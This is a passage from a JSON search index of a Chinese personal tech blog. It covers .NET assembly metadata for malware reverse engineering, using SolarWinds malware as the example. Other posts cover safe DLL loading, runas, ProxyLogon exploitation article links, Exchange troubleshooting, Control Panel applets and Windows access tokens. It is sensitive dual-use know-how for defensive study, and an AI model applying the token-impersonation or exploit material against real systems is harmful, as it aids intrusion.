描述每一个关键字（类成员变量），包括名称和类型，关键字如下所示： 名称：关键字名称 签名，指向关键字的类型签名的 blob 索引 标志位：指定字段属性，如可见性、静态&#x2F;实例，和仅初始化（只读）。 **引用表(Reference Tables)**：包含程序集外部但又程序集引用的代码信息，包含以下内容： 类型引用表（TypeRef Table）: 当前程序集引用的其他程序集中定义的类型的信息 成员引用表（MemberRef Table）：描述定义在其他模块或程序集的成员（方法、属性等） 清单元数据表（Manifest Metadata Table）：描述程序集本身，包含以下内容： 程序集表（Assembly Table）：关于程序集本身的一些信息，如名字，版本，已经强强签名校验。 应用程序集表（AssemblyRef Table）：描述当前程序集依赖的其他程序集，包括他们的名称、版本、公钥（如何是强名称的） 模块表（Module Table）：关于当前模块的一些信息，如模块名、用于标识唯一性的GUID 自定义属性表（CustomAttribute Table）：包含程序集中用于不同元素的自定义属性的详细信息。 事件表和属性表（Event Table and Property Table）：描述在类型中声明的事件和属性。 参数表（Param Table）：关于各函数参数的信息。 独立签名表（StandAlonesig Table）：独立签名可用于封装类型或方法签名。 常量表（Constant Table）：存储代码中定义的常量。 这些表对于 CLR 的操作至关重要，因为它们提供了执行程序集所需的上下文信息。在运行时读取他们以执行各种任务，如类型实例化、方法调用、安全验证等。 这些元数据表以高度优化的二进制格式编码，运行时可以有效地处理这些格式。通过反射，还可以以编程方式访问元数据，并且允许 .NET 应用程序在运行时检查自己跌结构或其他程序集的结构。这种内省能力支持 .NET 框架支持一系列动态编程。 元数据唯一标识（Metadata Unique Identidier,ID）元数据标记是 CLR 用于引用程序集的元数据表中的元数据元素的唯一标识符。这些表的每个条目都被分配了一个元数据标记，作为对该特定条目的稳定引用。 元数据标记对于 CLR 与已编译代码进行交互至关重要，因为它们为运行时库提供了有效的标识和访问元数据的方法。PE文件中的每个类型、成员、签名或其他元数据描述符都具有相应的标记。 在 dnSpy 中，每个方法在其声明之上都包含一个注释，信息包括令牌、RID、RVA 和文件偏移量。如下所示屏幕截图： 看一些各个字段的含义： 标记（Token）: 元数据标记的高字节（big-endian）指定元数据的类型，以便于运行时识别。它指示令牌引用的元数据中的那个表（TypeDef、TypeRef、MethodDef等）。有关令牌类型的值得我更多信息可以参见附录A。 行索引（Row Index,RID）：元数据标记的其余24位用于索引相关的元数据表。它们指示可以在哪里找到此元素的实际元数据的行号。由于每个表可以有数百万个条目，因此24位允许有足够范围的索引。 相对虚拟地址（RVA）: 相对虚拟地址是函数实体（编译的 IL 代码）相对于程序被加载到内存的基地址的地址。例如，0x00023B28 意味着该函数的 IL 代码从加载模块的基地址的内存偏移大小。CLR 使用 RVA 在运行时定位并执行函数代码。在 PE 文件的上下文中，该文件的格式用于windows平台的 .NET 程序集，当文件加载到内存后，RVA 被广泛用于引用文件的各个部分。 文件偏移（File Offset）: 这个值表示当前函数的 IL 代码在 .NET 程序集（.dll 或 .exe 文件）中的实际位置。0x00021D28 表示从文件开始到函数代码开始的位置的偏移量（以字节为单位）。这对于直接对程序集文件进行二进制分析或操作非常有用，因为它能准确的告诉你在文件中哪里可以找到该方法的代码。 元数据标记的结构在运行时解析引用提高了 CLR 的性能。例如，当 JIT 编译器需要将 IL 编译成本机代码时，它使用元数据标记来查找方法签名、类型信息等。元数据令牌系统还支持 CLR 的动态特性，比如反射。它允许有效地执行各种运行时服务，如类型安全、安全检查和跨语言互操作性。 元数据表示例如下所示为 SolarWinds 恶意软件的启动函数。 标记的高位（0x6）值为6，对应元数据表6，即方法定义表（MethodDef Table）。 标记的下半部分是 0x5FA，是其在 MethodDef Table 中的条目号。如下所示： 检查 Start 函数的元数据的下半部分，值 0x00058D66 是从可执行文件开始的偏移量，偏移量（0x1EC15）的值在 字符串流（#String stream） 中，它将包含方法名称：Start。如下所示是在 dnSpy 的 Hex 编辑器中的数据： 这里找 Start 函数在 #Strings 流中位置时，需要按照 Method 的索引来查找。hex(1530) &#x3D; 0x5FA，前文提到了 Strings 流的组成，所以在查找 Start 方法时，需要中 Strings 流中的方法名开始（Method），索引为 0x5FA。 字符串流中偏移量的值如上所示。dnSpy 会自动检测字符串的值。 要查看 String 流中的数据，需要执行以下操作： 在新窗口中，转到偏移量（相对于 字符串流基地址）并查看我们正在寻找的字符串 - Start。 Manifest（清单）.NET 清单是 .NET 程序集的关键部分，描述程序集中的元素如何彼此关联。它嵌入在每个程序集中，无论它是静态的还是动态的，并且包含程序集操作所需的基本数据，包括其版本要求、安全标识、范围定义以及对资源和类的引用的解析。 .NET 清单的主要功能是提供全面的元数据描述，以便于组件的识别、版本控制和依赖管理。它确保程序集是自描述的，有助于解析类型引用并将这些引用映射到包含其声明和实现的文件。这对于维护版本控制以及确保不同程序集合依赖它们的组件之间的兼容性尤为关键。 .NET 清单文件内容清单包括对程序集的标识和操作至关重要的各种信息： 程序集名称：指定程序集名称的文本字符串 版本号：包括主版本号和次版本号，以及修订版本号和构建版本号，供通用语言运行库用于执行版本策略。 语言及区域信息：指定程序集支持的语言和区域，对于包含区域性语言特定信息的附属程序集尤为重要。 程序集中的文件列表：包括程序集中包含的每个文件及其名称的散列，以确保完整性和程序集的完整性。 类型应用信息：运行时用于将类型引用映射到其声明和实现的文件，这对类型安全性和正确性至关重要。 引用程序集信息：列出当前程序集静态引用的其他程序集，包括它们的名称、元数据（如版本号、语言、操作系统）以及如果有强命名时的公钥 函数体结构.NET 函数体结构可以编码为 “Tiny” 格式和 “Fat”格式，根据函数的复杂性和需求，每种格式用于不同的目的。在 Tiny 头和 Fat 头之间的选择是有 .NET 编译器基于所编译函数的复杂性决定的。 Tiny 头（The Tiny header）是两种格式中较简单的一种。当一个方法满足特定的条件时，就会使用这个header： 函数体小于 64 bytes 堆栈深度不会超过8槽（堆栈上的每个条目都有一个槽，与条目的大小无关） 不包含本地变量或结构化异常处理程序（SEH） Tiny 头更加紧凑，并且针对小型函数进行了优化。 Tiny 头是一个单字节长度，下面的 2 bits 设置为 0x2（二进制 10），表示它是一个 Tiny 头，剩下的 6 bits 表示函数提的大小。这种紧凑的格式允许有效地存储小型函数体，减少了简单方法的元数据开销。 Field Size(Bits) Description Header Flag 2 在 Tiny 头中总是被设置为 10(二进制) Method Size 6 指定函数体的大小（以字节为单位，最大为 63 bytes） Fat 头（The Fat header）用户更复杂的函数主题，超过了 Tiny 头的限制： Fat 头用于不符合 Tiny 头标准的较大函数 它提供了其他信息，比如方法的局部变量和 SEH 当一个函数的大小或者复杂度超过了 Tiny 头的显示，就会使用 Fat 头。 Fat 头更大，由多个字段组成，包括一个标志字段，用于指示方法函数体的其他特征（例如异常处理或局部变量初始化）。 Field Size(Bits) 描述 Flags 2 指定函数图的属性，包括是否存在局部变量、初始局部变量等。最低位（0x3）在设置为 1 时表示 Fat 头。 Size 2 4 byte 大小的头。包括整个头部的大小，不仅仅是函数体的大小 MaxStack 2 方法执行期间操作数堆栈上任何点上的最大项数 CodeSize 4 函数体 IL 代码的大小（byte） LocalVarsigTok 4 用于局部变量签名的元数据标记，仅当方法具有局部变量时才显示 MoreSections N 例如异常处理子句的附件部分，如果在标志中指定，则显示。 想看更多字段说明，可以看 The .NET File Format 函数体示例如下所示为 DeleteDiscoveryProfileInternal 函数： 点击偏移量（或 RVA）将会条传到 HEX 窗口中函数的头部： 在这里，我们可以看到 dnSpy 在鼠标悬停在头部字节上时突出显示了头部字段。函数的内容-指令跟在头部后面，在 dnSpy 中表示为 image_core_ilmethod_fat.instruction[]。为了更好的理解和查看指令的值（操作码），我们将在 IDA 中打开恶意软件： 我们可以看到左边是每个操作妈的值，遵循 dnSpy 中的前两条指令： 总结在对 .NET 可执行文件结构的初步探索中，我们已经深入研究了 .NET 框架的复杂性，强调了其合法开发和恶意软件创建的双重用途。通过剖析 .NET 编译、运行以及元数据和程序集的复杂细节，我们已经为理解 .NET 程序函数如何执行以及如何为恶意目的操作它们奠定了基础。随着你深入研究 .NET 恶意软件逆向工程技术，你会发现这对你有效分析和对抗基于 .NET 威胁的恶意软件非常有效。 附录标记类型表 Token Type Value(Hex) Description Module 0x00 References a module definition. 引用模块定义 TypeRef 0x01 References a type in another module. 引用另一个模块类型 TypeDef 0x02 Defines a type within the module. FieldDef 0x04 Defines a field within a type. MethodDef 0x06 Defines a method within a type. ParamDef 0x08 Defines a parameter for a method. InterfaceImpl 0x09 Defines interface implementations for a type. MemberRef 0x0A References a field or method in another module. CustomAttribute 0x0C Defines a custom attribute. Permission 0x0E Defines declarative security permissions. Signature 0x11 Defines a standalone signature. Event 0x14 Defines an event within a type. Property 0x17 Defines a property within a type. ModuleRef 0x1A References an external module. TypeSpec 0x1B Specifies a type using a signature. Assembly 0x20 Defines assembly metadata. AssemblyRef 0x23 References another assembly. File 0x26 Defines an external file associated with the assembly. ExportedType 0x27 Defines a type exported from another assembly. ManifestResource 0x28 Defines an embedded resource. GenericParam 0x2A Defines a generic parameter for a type or method. MethodSpec 0x2B Specifies a method instantiation for a generic method. GenericParamConstraint 0x2C Specifies constraints on a generic parameter.","tags":[{"name":"C#","slug":"C","permalink":"http://example.com/tags/C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"http://example.com/categories/B-Code/CSharp/"}]},{"title":"【libssh2】 Windows 下 libssh2 编译步骤","date":"2024-03-12T06:29:26.830Z","path":"C_OpenSource/libssh2/","text":"概述：windows操作下编译 libssh2 静态库 运行管理员 CMD cmd 中运行要编译版本的 vcvars32.bat cmake 配置编译环境 1cmake -DBUILD_SHARED_LIBS=ON -DBUILD_STATIC_LIBS=ON -DBUILD_EXAMPLES=OFF -DOPENSSL_ROOT_DIR=&quot;D:\\OpenSSL-3.1-Win32-mtd&quot; -DOPENSSL_CRYPTO_LIBRARY=&quot;D:\\OpenSSL-Win32\\lib&quot; -DBUILD_TESTING=OFF -A Win32 . -B &quot;x86&quot; cmake 编译（或者使用sln工程） 123cmake --build x86 --config Debug# x64 Releasecmake --build x64 --config Release","tags":[],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"http://example.com/categories/C-OpenSource/"}]},{"title":"【API】 安全加载DLL","date":"2024-03-07T03:10:28.902Z","path":"A_OS/Windows/API/安全加载DLL/","text":"概述：如何安全加载dll文件，防止 dll 替换 123456789101112131415161718192021222324252627282930313233343536373839__inline HMODULE WINAPI LoadLibraryEx_api(LPCTSTR lpFileName, HANDLE hFile, DWORD dwFlags)&#123; return ::LoadLibraryEx(lpFileName, hFile, dwFlags);&#125;//安全版LoadLibrary_api，可以降低dll劫持的可能性HMODULE WINAPI LoadLibrary_api_s(LPCTSTR lpFileName)&#123;#ifdef __360PubDLLSafeInitHelper /* 当使用 S360时，我们优先使用 S360 提供是 DLL 安全加载。 这是因为 S360 提供的LoadLibraryFormSystem32能为Windows XP以及其他所有没有安装 KB2533623 的系统提供 LOAD_LIBRARY_SEARCH_SYSTEM32 特性。 提升不支持 LOAD_LIBRARY_SEARCH_SYSTEM32 特性系统中的安全性。 */ return S360::Helper::LoadLibraryFormSystem32(lpFileName);#elif defined _M_IX86 || defined _M_AMD64 || defined _M_IA64 /* https://docs.microsoft.com/zh-cn/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibraryexa Windows 7, Windows Server 2008 R2, Windows Vista and Windows Server 2008: The LOAD_LIBRARY_SEARCH_ flags are available on systems that have KB2533623 installed. To determine whether the flags are available, use GetProcAddress to get the address of the AddDllDirectory, RemoveDllDirectory, or SetDefaultDllDirectories function. If GetProcAddress succeeds, the LOAD_LIBRARY_SEARCH_ flags can be used with LoadLibraryEx. */ //不再使用ERROR_INVALID_PARAMETER判断，规避联想一键影音导致的Hook Bug。 static int bSafeLoadAvailable = 0; if (bSafeLoadAvailable == 0) &#123; //此处不考虑线程安全，因为多执行一次 GetProcAddress 操作没什么大不了的。 bSafeLoadAvailable = GetProcAddress(GetModuleHandleW(L&quot;Kernel32.dll&quot;), &quot;AddDllDirectory&quot;) != NULL ? 1 : -1; &#125; //尝试使用DLL安全初始化 return LoadLibraryEx_api(lpFileName, NULL, bSafeLoadAvailable == 1 ? /*LOAD_LIBRARY_SEARCH_SYSTEM32*/0x00000800 : 0);#else // ARM || ARM64 //始终使用DLL安全初始化 return LoadLibraryEx_api(lpFileName, NULL, /*LOAD_LIBRARY_SEARCH_SYSTEM32*/0x00000800);#endif&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"}]},{"title":"【cmd】 runas","date":"2024-02-26T07:04:37.056Z","path":"A_OS/Windows/cmd/runas/","text":"概述：runas 命令用法整理 0x01 帮助手册123456789101112131415161718192021222324252627282930313233343536373839runas /?C:\\Users\\holdy&gt;runas /?RUNAS 用法:RUNAS [ [/noprofile | /profile] [/env] [/savecred | /netonly] ] /user:&lt;UserName&gt; programRUNAS [ [/noprofile | /profile] [/env] [/savecred] ] /smartcard [/user:&lt;UserName&gt;] programRUNAS [ [/machine:&lt;MachineType&gt;] ] /trustlevel:&lt;TrustLevel&gt; program /noprofile 指定不应该加载用户的配置文件。 这会加速应用程序加载，但 可能会造成一些应用程序运行不正常。 /profile 指定应该加载用户的配置文件。 这是默认值。 /env 要使用当前环境，而不是用户的环境。 /netonly 只在指定的凭据限于远程访问的情况下才使用。 /savecred 用用户以前保存的凭据。 /smartcard 如果凭据是智能卡提供的，则使用这个选项。 /user &lt;UserName&gt; 应使用 USER@DOMAIN 或 DOMAIN\\USER 形式 /showtrustlevels 显示可以用作 /trustlevel 的参数的 信任级别。 /trustlevel &lt;Level&gt; 应该是在 /showtrustlevels 中枚举 的一个级别。 /machine 指定进程的计算机架构。 &lt;MachineType&gt; 应为 x86|amd64|arm|arm64 之一。 program EXE 的命令行。请参阅下面的例子示例:&gt; runas /noprofile /user:mymachine\\administrator cmd&gt; runas /profile /env /user:mydomain\\admin &quot;mmc %windir%\\system32\\dsa.msc&quot;&gt; runas /env /user:user@domain.microsoft.com &quot;notepad \\&quot;my file.txt\\&quot;&quot;注意: 只在得到提示时才输入用户的密码。注意: /profile 跟 /netonly 不兼容。注意: /savecred 跟 /smartcard 不兼容。 0x02 登录以指定的用户角色启动进程 1runas /USER:用户名 /netonly cmd.exe","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"【Exchange】 相关漏洞、文章整理","date":"2024-02-23T02:21:48.765Z","path":"A_OS/Windows/Exchange/【Exchange】index/","text":"概述：Exchange 相关漏洞及其相关文章整理 0x01 CVE-2021-26855相关文章： Microsoft Exchange Server CVE-2021–26855 漏洞利用 - 知乎 Reproducing the Microsoft Exchange Proxylogon Exploit Chain |","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Exchange","slug":"A-OS/Windows/Exchange","permalink":"http://example.com/categories/A-OS/Windows/Exchange/"}]},{"title":"【C】开发文章推荐","date":"2024-02-23T02:01:55.629Z","path":"B_Code/C/C好文推荐/","text":"概述：C开发相关文章推荐 0x01 关键字 C语言丨深入理解volatile关键字 - 知乎 C&#x2F;C++ 中 volatile 关键字详解 | 菜鸟教程","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"C","slug":"B-Code/C","permalink":"http://example.com/categories/B-Code/C/"}]},{"title":"【异常处理】Exchange异常","date":"2024-02-22T07:22:26.850Z","path":"A_OS/Windows/异常及错误处理/Exchange异常/","text":"概述：Exchange 运行异常整理及解决方案 0x01 ecp、owa登录后报错 http 500本人环境：windows server 2016 + exchange 2016 cu21 问题描述：Exchange 登录 ecp 或者 owa 之后报错 http Error 500 相关链接： http 500 EAC&#x2F;OWA exhange 2016 server 2016 Exchange Server 2019 HTTP Error 500 - Microsoft Q&amp;A Exchange 2019 访问OWA或者ECP 提示HTTP 500错误的解决方案 - 简书 Exchange 2016 - HTTP Error 500 after logging into ECP&#x2F;OWA - blog - Alexander Ollischer | Citrix | Microsoft 如果以下方案还是不行，可以再尝试一下重置 Exchange，微软官网文档：恢复 Exchange 服务器、恢复丢失Exchange Server、丢失Exchange Server恢复 | Microsoft Learn 解决思路先说一下本人解决的步骤，以下几个方法我都尝试后重启电脑，然后 Exchange 恢复正常。i cant distinguish which operation is effective. 运行 UpdateCas.ps1参考 Exchange 2016 - HTTP Error 500 after logging into ECP&#x2F;OWA - blog - Alexander Ollischer | Citrix | Microsoft C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin 目录 找到 UpdateCas.ps1 并运行 cmd中运行 iisreset (或者重启系统) 删除owa目录禁用管理员然后启用 12Disable-Mailbox administratorEnable-Mailbox administrator 最后还是重启下 iis 服务或者重启操作系统 重新创建 OWA 虚拟目录可以使用 Get-OwaVirtualDirectory 查看当前存在的 OWA 虚拟目录 打开 Exchange Management Shell 移除 OWA 虚拟目录 1Remove-OwaVirtualDirectory &#x27;EXCHANGE\\owa (Default Web Site)&#x27; # ‘EXCHANGE’为 exchange 主机名称 创建 OWA 虚拟目录 1New-OwaVirtualDirectory -WebSiteName &#x27;Default Web Site&#x27; 操作完成后重启 iis 服务或者重启操作系统 回收应用池 在 服务器面 板 — 打 开 工具“ASDI 编 辑 器 ” ，右键，连接到，找 到“连接点”的“选择一个已知命名上下文”，下拉选择“ 配 置 ”— 然 后 找 到“CN&#x3D;Services”—“CN&#x3D;Microsoft Exchange”—“CN&#x3D;&lt;你的 Exchange 组织名称”—“CN&#x3D;Client Acess”—右击“属性”—打开“编辑器”窗口—找到”MSExchCanaryData”—“属性”，然后清空该选项； 打开 Internet Iformation Service (IIS)，找到“应用程序池”，找到“MSExchangeOWAAppPool”，点击回收。 操作完成后重启 iis 服务或者重启操作系统 移除 config 文件将 C:\\inetpub\\wwwroot 目录下的 web.config 移出。我的操作是修改了文件名，最后还是改回了 web.config 0x02 Exchange 登录后提示没有该邮箱可能的原因，之前的操作中禁用了该邮箱。 可以使用以下命令启用： 1Enable-Mailbox administrator 或者 使用如下所示的命令修复 1New-MailboxRestoreRequest -SourceDatabase RecoveryDB01 -SourceStoreMailbox GUID -TargetMailbox test@keyman .com","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"异常及错误处理","slug":"A-OS/Windows/异常及错误处理","permalink":"http://example.com/categories/A-OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"}]},{"title":"【控制面板】注册表相关","date":"2024-02-20T16:00:00.000Z","path":"A_OS/Windows/【控制面板】注册表相关/","text":"概述：控制面板相关注册表，以及控制面板程序开发 0x01 控制面板项目.vxfssqiokfys{zoom:50%;} 对应的注册表位置： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace 说明： 用于存储和控制控制面板（Control Panel）中的项目。具体来说，ControlPanel\\NameSpace键下通常包含了一系列的子键，每个子键都代表控制面板中的一个特定的文件夹或项目。这些子键通常有一个名为&#123;GUID&#125;的名称，其中GUID是一个全局唯一标识符，用于唯一标识该文件夹或项目。 例如，如果你想在控制面板中添加或删除一个项目，你可能需要修改这个键或其下的子键。通过添加或删除子键，你可以改变控制面板的外观和行为。 0x02 控制面板项目控制面板项本身通常存储在 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cputs 或 HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cputs（对于 32 位程序在 64 位系统上的情况）中。每个控制面板项都有一个对应的 GUID，并指向其可执行文件或 DLL。 不过，ControlPanel\\NameSpace 通常用于自定义桌面上的“控制面板”文件夹内容，而不是直接控制控制面板项本身。 对于 ControlPanel\\NameSpace 下的 GUID，它们通常与桌面上的文件夹快捷方式相关联，而不是直接与控制面板项。例如，一个 GUID 可能指向一个包含多个控制面板项的文件夹，这些项在桌面上以单个图标的形式显示。 要获取特定 GUID 与其对应的项目或文件夹之间的确切关系，你需要查看注册表中的具体条目，并可能需要参考 Windows 内部文档或在线资源。但是，通常不建议直接修改这些条目，除非你确切知道自己在做什么，并且有备份或恢复计划，以防出现问题。 0x03 新建一个控制面板项目通常如果需要新建一个控制面板项目，则需要在 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cputs 路径下添加一个注册表项，并且注册表项需要指向 cpl 文件，如下图所示： 0x04 编写一个控制面板程序参考项目：gtrubach&#x2F;MyCPLApplet: Example of creating control panel applets in Windows. cpl 文件类似 dll 文件，入口函数不同，加载逻辑基本一致： 若口函数如下所示： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546extern &quot;C&quot; LONG APIENTRY CPlApplet( HWND hwndCPL, // handle of Control Panel window UINT uMsg, // message LONG_PTR lParam1, // first message parameter LONG_PTR lParam2 // second message parameter)&#123; AFX_MANAGE_STATE(AfxGetStaticModuleState()); LPCPLINFO lpCPlInfo; LONG retCode = 0; switch (uMsg) &#123; case CPL_INIT: // first message, sent once return TRUE; case CPL_GETCOUNT: // second message, sent once return 1L; // (LONG)NUM_APPLETS; case CPL_INQUIRE: // third message, sent once per app lpCPlInfo = (LPCPLINFO)lParam2; lpCPlInfo-&gt;idIcon = IDI_SAMPLE_CPL; lpCPlInfo-&gt;idName = IDS_SAMPLE_CPL_NAME; lpCPlInfo-&gt;idInfo = IDS_SAMPLE_CPL_DESCRIPTION; lpCPlInfo-&gt;lData = 0L; break; case CPL_DBLCLK: // application icon double-clicked &#123; CWnd wndCPL; BOOL b = wndCPL.Attach(hwndCPL); CMyPropertySheet propSheet(IDS_SAMPLE_CPL_NAME, &amp;wndCPL); // This is where you would retrieve information from the property // sheet if propSheet.DoModal() returned IDOK. We aren&#x27;t doing // anything for simplicity. propSheet.DoModal(); wndCPL.Detach(); &#125; break; &#125; return retCode;&#125;","tags":[{"name":"win","slug":"win","permalink":"http://example.com/tags/win/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【环境搭建】映射网络驱动器","date":"2024-02-18T16:00:00.000Z","path":"A_OS/Windows/环境搭建/【环境搭建】映射网络驱动器/","text":"概述：win10 搭建网络映射驱动器 网络驱动器：即把网络中的磁盘映射到本地，以便于网络内的机器共享。 场景：考虑有这么个场景：你的主机存储快没了，你也不想自己装块硬盘，正好还有台闲置电脑，那么可以考虑把那台闲置电脑的存储映射到你的主机上，从而实现扩容。所以本教程想实现的就是这么个目的。 现有 机器A 和 机器B，想在机器A上通过网络映射的方式扩展机器A的存储 (共享机器B的存储)，操作方法如下。 0x01 机器B 添加共享文件夹创建共享文件夹 复制共享路径 0x02 机器A 映射网络驱动器 0x03 相关补充如果要获取相关信息，参考微软文档 Windows 网络 (WNet) - Win32 apps | Microsoft Learn","tags":[{"name":"win","slug":"win","permalink":"http://example.com/tags/win/"},{"name":"驱动器","slug":"驱动器","permalink":"http://example.com/tags/%E9%A9%B1%E5%8A%A8%E5%99%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"环境搭建","slug":"A-OS/Windows/环境搭建","permalink":"http://example.com/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"【权限与会话】Windows 令牌","date":"2024-02-06T16:00:00.000Z","path":"A_OS/Windows/权限与会话/【权限与会话】Windows 令牌/","text":"概述：Winodws 令牌详解，关于 windows 初始令牌、主令牌，模拟令牌，关联令牌等概念的说明。 工具推荐：diversenok&#x2F;TokenUniverse: An advanced tool for working with access tokens and Windows security policy. 0x01 初始令牌初始令牌也称访问令牌，是描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐户的标识和特权信息。 当用户登录时，系统通过将用户密码与安全数据库（如域认证中的NTDS或本地认证中的SAM文件）中存储的信息进行比较来验证用户密码。 如果密码经过验证，则系统将生成访问令牌。代表该用户执行的每个进程都有此访问令牌的副本。（通常我们在输入密码登陆进入Windows界面时就是一个生成访问令牌的过程）当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。 访问令牌包含以下信息： flowchart LR A[访问令牌] --> 用户所在组SID A --> C[用户账户的安全描述符 SID] A --> D[\"标识当前登录会话(logon session)的登录SID\"] A --> E[\"特权（privilege）:用户或用户组拥有的特权列表\"] A --> F[\"其他数据\"] Access Token的组成 用户账户的安全标识符(SID) 用户所属的组的SID 用于标识当前登陆会话的登陆SID 用户或用户组所拥有的权限列表 所有者SID 主要组的SID 访问控制列表 访问令牌的来源 令牌是主要令牌还是模拟令牌 限制SID的可选列表 目前的模拟等级 其他统计的数据 初始令牌的创建过程Windows Access Token 创建过程，可以参考下 《深入解析 Windows 操作系统 第6版》第六章第8节相关描述 登录主要分为两种形式，一种是非交互式的，一种是交互式的 非交互式的，用户在输入用户名和密码后，由 WinLogon 调用 LSASS(Local Security Authority Subsystem Service) 中的相关函数（LasLogonUser）传递登录信息给认证包 对于交互式登录，Windows使用两个标准的认证包∶ Kerberos 和 MSV1_0 认证通过后，LSASS 在本地策略中查找该用户有哪些允许的访问，包括交互方式、网络方式、批方式或服务方式，如果当前所请求的登录不符合数据库中允许 的访问方式，则此次登录被终止。如果当前请求的登录是允许的，则 LSASS 会加入一些额外的安全ID(SID)，然后在策略数据库中查找用户所有SID的已经被授予的权限，并且把这些特权加入到用户的访问令牌中。 当 LSASS 已经积累了所有这些必要的信息时，会调用执行体来创建 &#x3D;&#x3D;访问令牌&#x3D;&#x3D;。执行体 为交互式登录或服务方式登录创建一个主访问令牌 为网络方式登录创建一个模仿令牌 创建成功后， LSASS 复制此令牌，创建一个可将此令牌传递给 WinLogon 的句柄，然后关闭自身句柄。 综上就是 Windows 初始令牌的创建过程。 之后，则是通过 WinLogon 中的令牌创建进程、线程。 进程持有一个主令牌，线程则使用的模拟令牌。 0x02 授权令牌和模拟令牌访问令牌（Access Token）是Windows操作系统用描述进程或者线程安全上下文的一个对象。 Windows下有两种类型的Token令牌：授权令牌和模拟令牌。 授权令牌（Delegation Token）也叫主令牌，是由 Windows 内核创建并分配给进程的默认访问令牌，每一个进程有一个主令牌，它描述了与当前进程相关的用户帐户的安全上下文。用于交互式登录（如rdp登录访问）。 模拟令牌（Impersonation Token）所在进程的主令牌会自动附加到当前的线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。用于非交互式的会话（利用WMI进行远程访问）。 注：两种令牌会在系统重启或者关机后才会全部清除，不然将会一直在内存中存留。也就是说，如果机器不关机或者重启的话，就会存在散落的令牌。在系统注销后，具有授权令牌的用户会变为模拟令牌 Impersonation Token，但依然有效。默认情况下，当前用户只能看到当前用户自己和比自己权限低的所有访问令牌。 每个进程都有一个主要令牌，用于描述与该进程关联的用户帐户的安全上下文。默认情况下，当进程的线程与安全对象进行交互时，系统使用主令牌。此外，线程可以模拟客户端帐户。模拟允许线程使用客户端的安全上下文与安全对象进行交互。模拟客户端的线程同时具有主令牌和模拟令牌。（出现这种情况是因为服务操作是在寄宿进程中执行，在默认的情况下，服务操作是否具有足够的权限访问某个资源（比如文件）取决于执行寄宿进程Windows帐号的权限设置，而与作为客户端的Windows帐号无关。在有多情况下，我们希望服务操作执行在基于客户端的安全上下文中执行，以解决执行服务进行的帐号权限不足的问题。简单来说就是我们希望不同客户端来访问服务时，服务可以模拟客户端的身份去访问服务，而不是用自己的主进程Token身份去访问。） 为什么使用模拟令牌使用模拟令牌有助于实现权限分离。即使进程本身可能拥有较高的权限，但通过模拟令牌，可以以较低权限的用户身份执行一些敏感操作，从而减小潜在的安全风险。 除权限分离以外，Windows 令牌机制带来了单点登录和访问控制等众多好处。 管理员登录时，将为用户创建两个单独的访问令牌：标准用户访问令牌和管理员访问令牌。标准用户访问令牌包含与管理员访问令牌相同的特定于用户的信息，但删除了管理员的 Windows 特权和 SID。此外，执行 explorer.exe 也通过标准令牌来显示桌面，而 explorer.exe 是父进程，所有其他用户启动的进程都从中继承其访问令牌。因此，除非用户批准应用程序使用完整的管理访问令牌，否则所有应用程序都会以标准用户身份运行。","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"令牌","slug":"令牌","permalink":"http://example.com/tags/%E4%BB%A4%E7%89%8C/"},{"name":"token","slug":"token","permalink":"http://example.com/tags/token/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"权限与会话","slug":"A-OS/Windows/权限与会话","permalink":"http://example.com/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"【COM】异步通知 ExecNotificationQueryAsync 